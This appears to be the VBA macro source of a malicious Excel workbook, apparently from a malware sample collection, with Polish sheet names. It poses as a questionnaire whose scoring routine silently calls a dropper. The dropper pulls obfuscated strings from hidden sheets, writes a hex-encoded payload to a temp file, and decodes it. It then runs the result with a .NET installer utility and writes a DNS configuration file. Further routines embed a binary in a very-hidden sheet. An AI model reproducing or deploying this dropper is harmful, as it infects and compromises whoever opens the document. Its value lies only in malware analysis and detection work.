Attribute VB_Name = "Arkusz1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Sub fun1(path As String, par As String)
Dim targetFile As String
Dim obj As Object
Dim parvar As Variant

targetFile = Split(path, "")(0)
Set obj = konwert()
parvar = par
Visible = 1
obj.ShellExecute targetFile, parvar, "", getGizmo(2), Visible
End Sub

Function getGizmo(loc As Integer)
ind = Worksheets("Arkusz2").Range("A" + CStr(loc)).value
getGizmo = Worksheets("Arkusz2").Range("A" + CStr(ind - 15)).value
End Function


Function konwert()
Set konwert = GetObject(getGizmo(3) + StrReverse(getGizmo(1))).Document.Application

End Function

Sub saveconfig(fso As Object, fileName As String, config As String)
Set mucha = fso.createtextfile(fileName)
mucha.WriteLine (config)
mucha.Close
End Sub

Sub saveHexFile(fso As Object, fileName As String, worksh As Object, startrow As Long)
  
  Dim value As Long
  Dim outValue As Long
  Dim row, col As Long
  Dim bufpos As Long
  Dim Digit As Integer
  Dim buffer As String
  
  Set mucha = fso.createtextfile(fileName)
  
  hexDigits = "0123456789abcdef"
  row = startrow
  col = 1
  bufpos = 0
  
  Do Until False
    If IsEmpty(worksh.Cells(row, col)) Then
      Exit Do
    End If
    
    value = worksh.Cells(row, col)
    outValue = value Mod 256
    
    Rem convert to hex
    outValueHigh = outValue \ 16
    Digit1 = Mid(hexDigits, outValueHigh + 1, 1)
    
    buffer = buffer + Digit1
    
    outValueLow = outValue Mod 16
    Digit2 = Mid(hexDigits, outValueLow + 1, 1)
    buffer = buffer + Digit2
      
    row = row + 1
    If (row > 65536) Then
      col = col + 1
      row = startrow
    End If
    
    bufpos = bufpos + 2
    If (bufpos > 100) Then
      mucha.WriteLine (buffer)
      bufpos = 0
      buffer = ""
    End If
    
  Loop
  mucha.WriteLine (buffer)
  mucha.Close
End Sub


Function findframeworkdir(fso As Object, basedir As String)
 basedirlen = Len(basedir)
 
 For Each objFolder In fso.GetFolder(basedir).SubFolders
                 res = InStr(basedirlen + 1, objFolder, "v4.")
        If res = basedirlen + 1 Then
          findframeworkdir = objFolder
          Exit Function
          
        End If
        
                 
                  
    Next
End Function



Sub test()
Dim p As String


Dim tmpname As String

 Dim fso As Object
 Dim kaczka As String
 Dim insutilfullname As String
 Dim tmpconfig As String
 Dim dns As String
 Sheets("Arkusz2").Visible = True
 Sheets("Dane").Visible = True
 
 
 Set fso = CreateObject(getGizmo(9))
 kaczka = fso.GetSpecialFolder(2)
  
  
frameworkdir = findframeworkdir(fso, getGizmo(5))
insutilfullname = frameworkdir + "\" + getGizmo(11)


tmpname = kaczka + "\" + fso.getTempName()
tmpname2 = kaczka + "\" + fso.getTempName()
tmpconfig = kaczka + "\" + "destiny.conf"

Call saveHexFile(fso, tmpname, Worksheets("dane"), 100)
fun1 getGizmo(4), "-" + getGizmo(6) + " " + tmpname + " " + tmpname2
dns = Sheets("Arkusz2").Cells(34, 1)

Call saveconfig(fso, tmpconfig, dns)


Application.Wait (Now + TimeValue("0:00:01"))
fun1 insutilfullname, "" + tmpname2
 Sheets("Arkusz1").Visible = True
 
 Sheets("Arkusz2").Visible = False
 Sheets("Dane").Visible = False
 
 


End Sub


Sub verify()

  punkty = 0
  For i = 1 To 9
     dana = Cells(i + 3, 2)
   If (dana = "-") Then
   MsgBox ("Prosze wypelnic wszystkie pozycje")
   Exit Sub
   End If
   If (dana = "tak") Then
   punkty = punkty + 1
   End If
   
  Next i
  
  Cells(18, 2) = punkty
  Call test
  End Sub

Attribute VB_Name = "Arkusz2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Arkusz3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Sub readFile()
  Dim fileName As Variant
  fileName = Application.GetOpenFilename(Title:="Select file to be opened")
  Filesize = FileLen(fileName)
  fileNum = FreeFile()
  Dim value As Integer
  Dim outValue As Long
  Dim row, col As Long
  Dim startrow As Long
  
  Cells.ClearContents
  
  startrow = 100
  row = startrow
  col = 1
  
  Open fileName For Binary Access Read As #fileNum
  For i = 1 To Filesize
    Get #fileNum, i, value
    value = value And 255
    
    'modify value
    
    outValue = Int(255 * Rnd) * 256 + value
    Cells(row, col) = outValue
    row = row + 1
    If (row > 65536) Then
      col = col + 1
      row = startrow
    End If
  Next
  Close (fileNum)
  
End Sub


Sub superhide()
ActiveWorkbook.Sheets("dane").Visible = xlSheetVeryHidden
End Sub

Sub superunhide()
ActiveWorkbook.Sheets("dane").Visible = xlSheetVisible


End Sub
Attribute VB_Name = "Ten_skoroszyt"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


INQUEST-PP=macro
